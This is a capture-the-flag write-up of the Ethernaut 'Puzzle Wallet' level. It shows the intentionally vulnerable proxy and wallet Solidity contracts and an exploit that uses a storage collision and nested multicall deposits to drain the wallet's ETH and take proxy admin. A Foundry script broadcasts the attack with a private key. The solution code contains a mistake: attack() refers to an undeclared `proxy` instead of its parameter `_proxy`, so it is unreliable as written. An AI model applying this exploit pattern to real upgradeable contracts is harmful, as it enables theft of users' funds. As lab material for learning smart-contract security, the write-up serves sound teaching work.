---
title: "Puzzle Wallet"
date: "2024-03-07"
lastmod: "2024-03-07T09:56:00.000Z"
draft: false
difficulty: "⭐⭐⭐⭐"
prev: "Dex-Two-f9572c09096541d3afbe107d66ac7fd9"
weight: 25
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/24"
next: "Motorbike-398e954682a44e3fb7240d3a1a9368bf"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "45b8e0a7-c478-4a4b-9526-72eecda0daa6"
  created_time: "2024-02-25T10:44:00.000Z"
  last_edited_time: "2024-03-07T09:56:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "f9c2f40a-0144-4e6d-a134-6b9fd725f7a9"
        name: "⭐⭐⭐⭐"
        color: "red"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Dex-Two-f9572c09096541d3afbe107d66ac7fd9"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Dex-Two-f9572c09096541d3afbe107d66ac7fd9"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-03-07"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 25
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/24"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Motorbike-398e954682a44e3fb7240d3a1a9368bf"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Motorbike-398e954682a44e3fb7240d3a1a9368bf"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Puzzle Wallet"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Puzzle Wallet"
          href: null
  url: "https://www.notion.so/Puzzle-Wallet-45b8e0a7c4784a4b952672eecda0daa6"
  public_url: null
UPDATE_TIME: "2024-03-09T20:19:42.234Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


Nowadays, paying for DeFi operations is impossible, fact.


A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.


They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system:
The admin, which has the power of updating the logic of the smart contract.
The owner, which controls the whitelist of addresses allowed to use the contract.
The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.


Little did they know, their lunch money was at risk…


You'll need to hijack this wallet to become the admin of the proxy.


Things that might help:

- Understanding how `delegatecall` works and how `msg.sender` and `msg.value` behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../lib/forge-std/src/console.sol";

interface PuzzleProxy {
  function init(uint256 _maxBalance) external;
  function owner() external returns(address);
  function pendingAdmin() external returns(address);
  function maxBalance() external returns(uint);
  function setMaxBalance(uint) external;
  function admin() external returns(address);
  function proposeNewAdmin(address _newAdmin) external;
  function approveNewAdmin(address _expectedAdmin) external;
  function multicall(bytes[] calldata data) external payable; 
  function deposit() external payable;
  function addToWhitelist(address addr) external;
  function execute(address to, uint256 value, bytes calldata data) external payable;
  function balances(address) external returns(uint);
  function implementation() external returns (address);
}

contract Attacker {
  function attack(PuzzleProxy _proxy) public payable {
    // [slot0] PuzzleWallet: owner => PuzzleProxy: pendingAdmin
    // This mean that owner is now the address of the attacker
    proxy.proposeNewAdmin(address(this));
    proxy.addToWhitelist(address(this));

    bytes memory deposit = abi.encodeCall(PuzzleProxy.deposit, ());

    // We can call multicall inside multicall to bypass the depositCalled flag
    // It's like some sort of re-entrancy variant attack
    bytes[] memory datas = new bytes[](1);
    datas[0] = deposit;
    bytes memory multicall = abi.encodeCall(PuzzleProxy.multicall, (datas));

    bytes[] memory selectors = new bytes[](2);
    selectors[1] = multicall; // One deposit call nested iside a multicall
    selectors[0] = deposit; // The second deposit call

    // So we deposit once but we can increase our balance twice !
    proxy.multicall{ value: msg.value }(selectors);

    // Then we can withdraw all funds to our address
    proxy.execute(msg.sender, address(_proxy).balance, "");

    // Then we can overwrite the maxBalance slot which map to the admin slot
    // inside the proxy contract :)
    proxy.setMaxBalance(uint160(address(msg.sender)));
  }
}

```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,PuzzleProxy} from '../src/24.sol';

contract POC is Script {

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_24");

        vm.startBroadcast(deployerPrivateKey);

        Attacker attacker = new Attacker();
        PuzzleProxy proxy = PuzzleProxy(addr);

        console.logAddress(proxy.admin());
        
        attacker.attack{ value: address(proxy).balance }(proxy);

        console.logAddress(proxy.admin());

        vm.stopBroadcast();

    }
}
```


Next time, those friends will request an audit before depositing any money on a contract. Congrats!


Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.


Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.


Move on to the next level when you're ready!

